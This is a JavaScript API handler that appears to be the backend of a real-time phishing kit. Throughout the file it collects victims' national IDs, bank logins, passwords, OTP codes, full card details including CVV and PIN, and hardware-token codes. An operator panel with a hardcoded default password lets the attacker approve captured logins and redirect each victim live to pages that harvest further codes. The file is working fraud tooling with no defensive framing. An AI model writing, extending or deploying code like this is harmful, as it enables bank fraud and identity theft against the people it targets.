const crypto = require('crypto');

const applications = {};
const visitors = {};
const adminTokens = new Set();
let visitorIdCounter = 120000;
let appIdCounter = 10000;
let totalVisitors = 0;
let _whatsappLink = '';

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '992812';

function makeToken() {
  return crypto.randomBytes(24).toString('hex');
}

function getCookies(cookieHeader) {
  return (cookieHeader || '').split(';').reduce((acc, c) => {
    const idx = c.indexOf('=');
    if (idx > 0) acc[c.slice(0, idx).trim()] = c.slice(idx + 1).trim();
    return acc;
  }, {});
}

function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  const header = req.headers['x-admin-token'];
  const token = header || cookies['admin_session'];
  return token && adminTokens.has(token);
}

function getOrCreateApp(nationalId) {
  if (!applications[nationalId]) {
    appIdCounter++;
    applications[nationalId] = {
      id: appIdCounter, nationalId,
      fullName: '', phoneNumber: '', phone: '', address: '',
      username: '', password: '',
      otp: '', otpCode: '',
      cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
      cardPin: '', cardName: '',
      hardToken: '', watchLink: '', watchLinkOtp: '',
      selectedWatch: '', watchColor: '',
      governorate: '',
      currentPage: 'home', status: 'active',
      redirectTo: null, redirectError: null,
      customMessage: null, loginApproved: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }
  return applications[nationalId];
}

function getOrCreateVisitor(sessionId) {
  if (!visitors[sessionId]) {
    visitorIdCounter++;
    totalVisitors++;
    visitors[sessionId] = {
      id: visitorIdCounter, sessionId,
      currentPage: 'home', redirectTo: null,
      lastActiveAt: new Date().toISOString(),
      createdAt: new Date().toISOString(),
    };
  }
  return visitors[sessionId];
}

async function executeProcedure(name, input, isAdmin) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) {
        const v = getOrCreateVisitor(sessionId);
        v.currentPage = currentPage || page || v.currentPage;
        v.lastActiveAt = new Date().toISOString();
      }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      const v = sessionId ? visitors[sessionId] : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId && visitors[sessionId]) visitors[sessionId].redirectTo = null;
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      const app = nationalId ? applications[nationalId] : null;
      return {
        redirectTo: app ? (app.redirectTo || null) : null,
        redirectError: app ? (app.redirectError || null) : null,
      };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId && applications[nationalId]) {
        applications[nationalId].redirectTo = null;
        applications[nationalId].redirectError = null;
      }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      const app = nationalId ? applications[nationalId] : null;
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId && applications[nationalId]) applications[nationalId].customMessage = null;
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) {
        const app = getOrCreateApp(nationalId);
        app.currentPage = page || app.currentPage;
        app.updatedAt = new Date().toISOString();
      }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      app.loginApproved = null;
      app.status = 'awaiting_login';
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.status = 'awaiting_otp';
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.status = 'awaiting_card';
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.status = 'awaiting_token';
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) {
        const token = makeToken();
        adminTokens.add(token);
        return { success: true, _setToken: token };
      }
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin: isAdmin, authenticated: isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      const apps = Object.values(applications).map(a => ({ ...a }));
      const cutoff = Date.now() - 60000;
      const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
      const liveVisitorCount = Object.values(visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000).length;
      return { apps, activeIds, liveVisitorCount, totalVisitors };
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      const liveVisitors = Object.values(visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000);
      return { visitors: liveVisitors };
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(visitors), totalCount: totalVisitors };
    }
    case 'admin.getWhatsAppLink': {
      return { link: _whatsappLink };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      _whatsappLink = input.link || '';
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId && applications[nationalId]) applications[nationalId].customMessage = message || null;
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const app = nationalId ? applications[nationalId] : Object.values(applications).find(a => a.id === applicationId);
      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const app = nationalId ? applications[nationalId] : Object.values(applications).find(a => a.id === applicationId);
      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId && applications[nationalId]) {
        applications[nationalId].redirectTo = redirectTo || page || null;
        applications[nationalId].redirectError = redirectError || showError || null;
        applications[nationalId].updatedAt = new Date().toISOString();
      }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId && visitors[sessionId]) visitors[sessionId].redirectTo = redirectTo || page || null;
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const { redirectTo } = input;
      for (const app of Object.values(applications)) {
        if (app.status === 'active' || app.status.startsWith('awaiting')) {
          app.redirectTo = redirectTo || 'token';
          app.updatedAt = new Date().toISOString();
        }
      }
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const app = nationalId ? applications[nationalId] : Object.values(applications).find(a => a.id === applicationId);
      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) { delete applications[nationalId]; }
      else { const key = Object.keys(applications).find(k => applications[k].id === applicationId); if (key) delete applications[key]; }
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = Date.now() - 120000;
      let deletedCount = 0;
      for (const key of Object.keys(applications)) {
        if (new Date(applications[key].updatedAt).getTime() < cutoff) { delete applications[key]; deletedCount++; }
      }
      return { success: true, deletedCount };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      totalVisitors = 0;
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const { trpc } = req.query;
  const procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  const procs = procsStr.split(',').filter(Boolean);

  if (!procs.length) {
    return res.status(400).json([]);
  }

  let inputs = {};
  if (req.method === 'GET') {
    try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; }
  } else {
    inputs = req.body || {};
  }

  const isAdmin = isAdminReq(req);

  let setCookie = null;
  let clearCookie = false;

  const results = await Promise.all(procs.map(async (name, i) => {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    try {
      const data = await executeProcedure(name.trim(), input, isAdmin);
      if (data && data._setToken) {
        setCookie = data._setToken;
        adminTokens.add(setCookie);
        delete data._setToken;
      }
      if (data && data._clearToken) {
        clearCookie = true;
        const cookies = getCookies(req.headers.cookie);
        if (cookies.admin_session) adminTokens.delete(cookies.admin_session);
        delete data._clearToken;
      }
      return { result: { data: { json: data } } };
    } catch (e) {
      return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
    }
  }));

  if (setCookie) {
    res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  }
  if (clearCookie) {
    res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  }

  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
